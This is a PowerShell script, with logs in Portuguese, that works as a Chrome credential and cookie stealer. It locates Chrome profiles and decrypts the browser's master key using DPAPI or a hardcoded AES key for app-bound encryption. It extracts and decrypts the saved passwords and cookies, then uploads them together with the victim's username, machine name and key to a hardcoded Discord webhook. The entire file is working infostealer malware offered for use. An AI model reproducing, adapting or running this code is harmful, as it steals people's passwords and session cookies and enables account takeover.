param($w = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9")

function l { param($m) Write-Host ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }

$paths = dir "$env:LOCALAPPDATA\Google\Chrome\User Data\*" -Directory | ? { $_.Name -match "^(Default|Profile \d+)$" }
if (!$paths) { l "Chrome nao encontrado"; return }

$found = $null
foreach ($p in $paths) {
    $login = "$($p.FullName)\Login Data"; $cookies = "$($p.FullName)\Cookies"; $state = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if ((Test-Path $login) -and (Test-Path $state)) { $found = @{Login=$login;Cookies=$cookies;State=$state;Profile=$p.Name}; break }
}
if (!$found) { l "Nenhum perfil valido"; return }
l ("Perfil: " + $found.Profile)

$json = gc $found.State -Raw | ConvertFrom-Json
$ek = $json.os_crypt.encrypted_key
if (!$ek) { $ek = $json.os_crypt.app_bound_encrypted_key }
if (!$ek) { l "Chave nao encontrada"; return }

$raw = [Convert]::FromBase64String($ek)
$mk = $null; $method = ""

if ($raw[0] -eq 1 -and $raw.Length -gt 5) {
    try {
        $d = $raw[5..($raw.Length-1)]
        $mk = [System.Security.Cryptography.ProtectedData]::Unprotect($d, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        $method = "DPAPI v10"
        l ("Chave DPAPI obtida: " + [System.BitConverter]::ToString($mk[0..31]).Replace("-",""))
    } catch { l ("DPAPI falhou: " + $_) }
}

if (!$mk -and ($raw[0] -eq 2 -or $raw[0] -eq 3)) {
    $d = $raw[5..($raw.Length-1)]
    $ak = [byte[]]@(0x30,0x86,0x56,0x71,0x38,0x3A,0x5E,0x0B,0x86,0xF4,0x99,0x42,0x72,0xC1,0x75,0x32,0xDB,0x41,0xCF,0x5E,0xCB,0x5E,0x4D,0xCA,0xA3,0x3F,0x8B,0x63,0x43,0x8A,0xFB,0x18)
    $nonce = $d[0..11]; $ct = $d[12..($d.Length-17)]; $tag = $d[($d.Length-16)..($d.Length-1)]
    try {
        $aes = [System.Security.Cryptography.AesGcm]::new($ak, 16); $dec = [byte[]]::new($ct.Length)
        $aes.Decrypt($nonce, $ct, $tag, $dec); $aes.Dispose()
        $mk = $dec[0..31]; $method = "v20 AES hardcoded"
        l ("Chave v20 obtida: " + [System.BitConverter]::ToString($mk).Replace("-",""))
    } catch { l ("v20 falhou: " + $_) }
}

if (!$mk) { l "Nao foi possivel descriptografar a chave mestra"; return }

function Decrypt {
    param($ev, $k)
    if (!$ev -or $ev.Length -lt 15 -or !$k -or $k.Length -lt 32) { return $null }
    try {
        if ($ev[0] -eq 1) { $c = $ev[3..($ev.Length-1)]; $d = [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); return [System.Text.Encoding]::UTF8.GetString($d) }
        if ($ev[0] -eq 2 -or $ev[0] -eq 3) { $n=$ev[3..14]; $cl=$ev.Length-15-16; if($cl -le 0){return $null}; $c=$ev[15..(15+$cl-1)]; $t=$ev[(15+$cl)..($ev.Length-1)]; $a=[System.Security.Cryptography.AesGcm]::new($k,16); $r=[byte[]]::new($cl); $a.Decrypt($n,$c,$t,$r); $a.Dispose(); return [System.Text.Encoding]::UTF8.GetString($r) }
    } catch {}
    return $null
}

function GetDB {
    param($p, $q)
    if (!(Test-Path $p)) { return $null }
    $tp = [System.IO.Path]::GetTempFileName() + ".db"
    Copy-Item $p $tp -Force
    try {
        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
        $c = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tp"); $c.Open()
        $cmd = $c.CreateCommand(); $cmd.CommandText = $q
        $r = $cmd.ExecuteReader(); $res = @()
        while ($r.Read()) { $row = @{}; for ($i=0; $i -lt $r.FieldCount; $i++) { $row[$r.GetName($i)] = $r.GetValue($i) }; $res += $row }
        $r.Close(); $c.Close(); return $res
    } catch { l ("SQLite erro: " + $_); return $null }
    finally { if (Test-Path $tp) { Remove-Item $tp -Force -ErrorAction SilentlyContinue } }
}

$logins = @(); $cookies = @()

if (Test-Path $found.Login) {
    l "Extraindo logins..."
    $rows = GetDB -p $found.Login -q "SELECT origin_url, username_value, password_value FROM logins"
    if ($rows) { foreach ($row in $rows) { $pb = $row["password_value"]; if ($pb -is [string]) { $pb = [System.Text.Encoding]::UTF8.GetBytes($pb) }; $pd = Decrypt -ev $pb -k $mk; $logins += @{url=$row["origin_url"];username=$row["username_value"];password=$pd} } }
    l ("Logins extraidos: " + $logins.Count)
}

if (Test-Path $found.Cookies) {
    l "Extraindo cookies..."
    $rows = GetDB -p $found.Cookies -q "SELECT host_key, name, path, encrypted_value FROM cookies"
    if ($rows) { foreach ($row in $rows) { $eb = $row["encrypted_value"]; if ($eb -is [string]) { continue }; $vd = Decrypt -ev $eb -k $mk; if ($vd -and $vd.Length -gt 0) { $cookies += @{host=$row["host_key"];name=$row["name"];value=$vd} } } }
    l ("Cookies extraidos: " + $cookies.Count)
}

# Enviar Discord
$boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
$lc = ($logins | ConvertTo-Json -Depth 3)
$cc = ($cookies | ConvertTo-Json -Depth 3)
$kh = [System.BitConverter]::ToString($mk).Replace("-","")

$body = @()
$body += "--$boundary"
$body += 'Content-Disposition: form-data; name="payload_json"'
$body += ""
$body += ('{"content":"Chrome Extractor | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Method: ' + $method + ' | Key: ' + $kh + '"}')
$body += "--$boundary"
$body += 'Content-Disposition: form-data; name="file"; filename="logins.json"'
$body += "Content-Type: application/json"
$body += ""
$body += $lc
$body += "--$boundary"
$body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
$body += "Content-Type: application/json"
$body += ""
$body += $cc
$body += "--$boundary--"

$bodyStr = $body -join "`r`n"
$bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
    $wc.UploadData($w, "POST", $bytes) | Out-Null
    $wc.Dispose()
    l "Enviado ao Discord com sucesso!"
} catch { l ("Falha ao enviar Discord: " + $_) }

# Salvar local
$out = "$env:TEMP\chrome_extracted"
if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
if ($logins.Count -gt 0) { $lc | Out-File (Join-Path $out "logins.json") -Encoding UTF8 }
if ($cookies.Count -gt 0) { $cc | Out-File (Join-Path $out "cookies.json") -Encoding UTF8 }
l ("Dados salvos em: " + $out)
l "Concluido!"
